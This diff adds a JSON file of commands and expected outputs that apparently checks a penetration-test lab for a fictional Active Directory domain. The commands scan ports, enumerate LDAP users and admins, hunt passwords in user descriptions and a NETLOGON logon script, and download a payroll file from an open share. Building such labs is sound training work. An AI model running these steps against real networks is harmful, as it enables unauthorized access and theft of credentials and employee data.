@@ -1,0 +1,16 @@
+[
+  { "cmd": "ls /srv /etc/escopo", "espera": "Permission denied" },
+  { "cmd": "nmap -sT -p 389,445,80,443 10.20.0.0/24", "espera": "10\\.20\\.0\\.10[\\s\\S]*389/tcp +open[\\s\\S]*10\\.20\\.0\\.20[\\s\\S]*445/tcp +open" },
+  { "cmd": "ldapsearch -x -H ldap://10.20.0.10 -s base -b '' namingContexts | grep namingContexts:", "espera": "dc=bomsossego,dc=exemplo" },
+  { "cmd": "ldapsearch -x -H ldap://10.20.0.10 -b dc=bomsossego,dc=exemplo '(objectClass=user)' sAMAccountName | grep -c '^sAMAccountName:'", "espera": "\\s22\\s" },
+  { "cmd": "ldapsearch -x -H ldap://10.20.0.10 -b dc=bomsossego,dc=exemplo '(description=*senha*)' sAMAccountName description pwdLastSet", "espera": "Sossego@2024[\\s\\S]*pwdLastSet: 2024-02-05" },
+  { "cmd": "ldapsearch -x -H ldap://10.20.0.10 -b dc=bomsossego,dc=exemplo -s base minPwdLength lockoutThreshold", "espera": "minPwdLength: 6[\\s\\S]*lockoutThreshold: 0" },
+  { "cmd": "ldapsearch -x -H ldap://10.20.0.10 -b 'cn=Domain Admins,ou=Grupos,dc=bomsossego,dc=exemplo' member | grep -c '^member:'", "espera": "\\s6\\s" },
+  { "cmd": "smbclient -L //10.20.0.20 -U 'servidor.teste%Teste@Contrato1' 2>&1 | grep -E 'Publico|Financas|RH'", "espera": "Publico[\\s\\S]*Financas" },
+  { "cmd": "smbclient //10.20.0.10/NETLOGON -U 'servidor.teste%Teste@Contrato1' -c 'get logon.bat /tmp/logon.bat' >/dev/null 2>&1; cat /tmp/logon.bat", "espera": "Sossego#Financas2019" },
+  { "cmd": "smbclient //10.20.0.20/Publico -U 'servidor.teste%Teste@Contrato1' -c 'ls' 2>&1", "espera": "folha_pagamento_2026-10\\.csv" },
+  { "cmd": "cd /tmp && smbclient //10.20.0.20/Publico -U 'servidor.teste%Teste@Contrato1' -c 'get folha_pagamento_2026-10.csv' >/dev/null 2>&1; wc -l folha_pagamento_2026-10.csv", "espera": "413 folha_pagamento" },
+  { "cmd": "smbclient //10.20.0.20/Financas -U 'servidor.teste%Teste@Contrato1' -c 'ls' 2>&1 | tail -1", "espera": "NT_STATUS_ACCESS_DENIED" },
+  { "cmd": "nmap -p 445 --script smb2-security-mode,smb-protocols 10.20.0.20", "espera": "NT LM 0\\.12[\\s\\S]*enabled but not required|enabled but not required[\\s\\S]*NT LM 0\\.12" },
+  { "cmd": "echo fim" }
+]
